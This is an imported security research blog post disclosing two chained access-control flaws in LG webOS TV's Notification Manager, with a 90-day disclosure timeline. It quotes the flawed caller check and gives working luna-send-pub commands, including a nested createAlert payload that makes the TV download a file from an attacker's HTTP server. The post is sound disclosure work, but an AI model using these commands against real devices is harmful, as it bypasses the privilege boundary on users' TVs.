---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-03-02_webos-revisited-even-more-mistaken-identities.md
original_filename: 2022-03-02_webos-revisited-even-more-mistaken-identities.md
title: webOS Revisited - Even More Mistaken Identities
category: documents
detected_topics:
- access-control
- command-injection
- automation-abuse
- business-logic
- api-security
- cloud-security
tags:
- imported
- documents
- access-control
- command-injection
- automation-abuse
- business-logic
- api-security
- cloud-security
language: en
raw_sha256: b64359004f8b54aa25a0bd2738d8e987f56a466a86103ac848ebf4a1a0562fd7
text_sha256: a27c880bc9d7b3c2993ce96f7123c4160603eae09cf2554b6ccaf3a4977099a8
ingested_at: '2026-06-28T07:32:10Z'
sensitivity: unknown
redactions_applied: false
---

# webOS Revisited - Even More Mistaken Identities

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-03-02_webos-revisited-even-more-mistaken-identities.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, automation-abuse, business-logic, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:10Z
- Redactions Applied: False
- Raw SHA256: `b64359004f8b54aa25a0bd2738d8e987f56a466a86103ac848ebf4a1a0562fd7`
- Text SHA256: `a27c880bc9d7b3c2993ce96f7123c4160603eae09cf2554b6ccaf3a4977099a8`


## Content

---
title: "webOS Revisited - Even More Mistaken Identities"
page_title: "webOS Revisited - Even More Mistaken Identities · The Recurity Lablog"
url: "https://blog.recurity-labs.com/2022-03-02/webOS_Pt2.html"
final_url: "https://blog.recurity-labs.com/2022-03-02/webOS_Pt2.html"
authors: ["Andreas Lindh (@addelindh)"]
programs: ["LG"]
bugs: ["Local Privilege Escalation", "Browser hacking"]
publication_date: "2022-03-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2858
---

Written by Andreas  
on March 02, 2022

# webOS Revisited - Even More Mistaken Identities

For an overview and introduction to webOS and this research, please see my [previous post](https://blog.recurity-labs.com/2021-02-03/webOS_Pt1.html).

# The TL;DR

On November 11, 2021, I sent an additional report to the `LG Product Security` team. This report consisted of two internal access control vulnerabilities in LG webOS TV, which, when chained together, will enable an unprivileged attacker (such as a webOS app) to call any protected and security-sensitive internal API, which could result in arbitrary file access, file overwrites, and more. For both, practical and bureaucratic reasons, the full impact of these vulnerabilities are yet to be determined.

In the report, Recurity Labs set a 90-day disclosure deadline, which expired on February 10, 2022. As LG informed us that the patch would not be ready and rolled-out until the end of February, we decided to hold back this post, but are now publishing the details of the vulnerabilities reported to LG.

# Hindsight (And Sometimes Foresight) is 20/20

Before we start, it should be mentioned that in hindsight, I was correct in stating the following in my previous post:
  
  
  While LG claims that this issue does not affect their (physical) devices, it is our impression that it affects webOS in general, and therefore should be taken seriously.
  

Since then, the vulnerability has been used to root actual physical LG TVs and has also been implemented as one of the techniques used by [RootMyTV](https://rootmy.tv). The main reason for this development is that LG insisted on not fixing the actual root cause of the vulnerability and instead treated it like a mere configuration issue. From the previous blog post:
  
  
  However, as the root cause of the issue is within code rather than LG’s custom configuration, we feel that it is still valid. As far as Recurity Labs are aware, LG is the maintainer of the webOS Open Source Edition (OSE), which (to date) has not been updated to remediate this issue, even though LG claims that it has been fixed. This implies that the root cause will not be remediated.
  

Ironically, it is likely that the information in this blog post can - on some devices - be used to bypass the configuration update that was meant to fix the previous issue. Time will tell, I guess.

# Getting Started

As mentioned before, the report consists of two separate vulnerabilities, which bypass different internal access controls:

1) Bypassing the Notification Manager’s access restrictions 2) Abusing the Notification Manager to further bypass restrictions for other APIs

Both vulnerabilities were discovered and validated on an LG smart TV (Model 65SM8500PLA), running webOS TV version 05.10.30. The following chapters outline the details.

# Same Procedure As Last Year

The Notification Manager is used by internal system services in order to manage notifications, such as alerting about system- and app updates etc. It cannot be called by regular applications, as described in LG’s [developer pages](https://webostv.developer.lge.com/design/webos-tv-system-ui/notifications/):
  
  
  Because TV users spend most of their time on immersive activities, sending notifications is not allowed on webOS TV. All types of notifications are reserved as system-related events.
  

However, due to a logic flaw in the `notificationmgr/Settings.cpp` file, this can be bypassed using the `luna-send-pub` command line tool, which is resolved as `com.webos.lunasendpub` internally.

From `Settings.cpp` (l. 371):
  
  
  bool Settings::isPrivilegedSource(const std::string &callerId)
  {
  if(callerId.find("com.palm.",0) == std::string::npos && callerId.find("com.webos.", 0) == std::string::npos && callerId.find("com.lge.",0) == std::string::npos)
  {
  return false;
  }
  return true;
  }
  

As a result, calls from `luna-send-pub` will internally come from `com.webos.lunasendpub` and will pass the above check. Please note that this is similar to the issue concerning the Download Manager, as detailed in my [previous post](https://blog.recurity-labs.com/2021-02-03/webOS_Pt1.html).

While being able to send notifications may not sound like a huge security risk, being able to call the Notification Manager opens some new, interesting, paths to explore.

# Now You See Me, Now You Don’t

The `luna://com.webos.notification/createAlert` API of the Notifications Manager allows for specifying subsequent actions, which can be defined via the `onclick`, `onclose`, and `onfail` parameters. When supplying such parameters, the Notification Manager will check that the caller has sufficient permissions to execute the specified subsequent action (here, calling an API). This is demonstrated in the following section. Please note that - for demonstration purposes - the Download Manager has been used, as it is only accessible for system applications and thereby should not be accessible by an unprivileged user.

First, calling the Download Manager directly will fail.
  
  
  /media/developer $ luna-send-pub -n 1 -f luna://com.webos.service.downloadmanager/download '{"target":"http://192.168.0.3:8000/testfile","targetDir":"/tmp/"}'
  {
  "errorCode": -1,
  "returnValue": false,
  "errorText": "Denied method call \"download\" for category \"/\""
  }
  

Second, calling the Download Manager via the subsequent `onclick` action when calling the `createAlert` API will also fail, as the caller will still not be allowed to call the Download Manager.
  
  
  /media/developer $ luna-send-pub -n 1 -f luna://com.webos.notification/createAlert '{"message":"hello world","buttons":[{"label":"button1","onclick":"luna://com.webos.service.downloadmanager/download","params":{"target":"http://192.168.0.3:8000/testfile","targetDir":"/tmp/"}}]}'
  {
  "returnValue": false,
  "errorText": "Not allowed to call method specified in the uri: luna://com.webos.service.downloadmanager/download"
  }
  

However, by specifying the `createAlert` API itself as the subsequent `onclick` action, and then specifying the Download Manager (which is restricted) as the `onclick` action for the second call to `createAlert`, this access control can be circumvented, as the caller for the second check will be the Notification Manager - which is a privileged process - and not the actual calling user.

The following command demonstrates this.
  
  
  /media/developer $ luna-send-pub -n 1 -f luna://com.webos.notification/createAlert '{"message":"hello world","buttons":[{"label":"button 1","onclick":"luna://com.webos.notification/createAlert","params":{"message":"hello again world","buttons":[{"label":"button 2","onclick":"luna://com.webos.service.downloadmanager/download","params":{"target":"http://192.168.0.3:8000/testfile","targetFilename":"testfile_666"}}]}}]}'
  {
  "alertId": "com.webos.lunasendpub-20724-1630326598223",
  "returnValue": true
  }
  

After the second notification box has been pressed on the TV, the system will make the request to the specified URL and will download the file.
  
  
  Serving HTTP on 0.0.0.0 port 8000 ...
  192.168.0.17 - - [30/Aug/2021 14:30:05] "GET /testfile HTTP/1.1" 200 -
  

Since `targetFilename` was also specified in the embedded payload, the file will be named `testfile_666`.
  
  
  /media/developer $ cat /media/internal/downloads/testfile_666
  this a testfile
  

While many other internal APIs exist, which could be accessed using this technique and used to further penetrate the system, this will not be covered by this blog post. We will leave this as an exercise for other fellow hackers.

# In Summary

As can be seen in this and the [previous post](https://blog.recurity-labs.com/2021-02-03/webOS_Pt1.html), webOS relies heavily on being able to identify the user calling an internal API. While this is a standard way of implementing access restrictions, these findings show that even very basic controls can sometimes be confused by the added-on complexity of advanced functionality. Given that webOS also has a huge amount of (largely unused) legacy functionality, and that this design seems to be part of it, it is not surprising that such things happen. I guess, the point is that even a seemingly sound design may have its quirks and flaws and that it can be great fun to hunt them down.

[←](http://blog.recurity-labs.com/2022-08-09/Huridocs) [→](http://blog.recurity-labs.com/2021-11-18/safari_hsts) Top
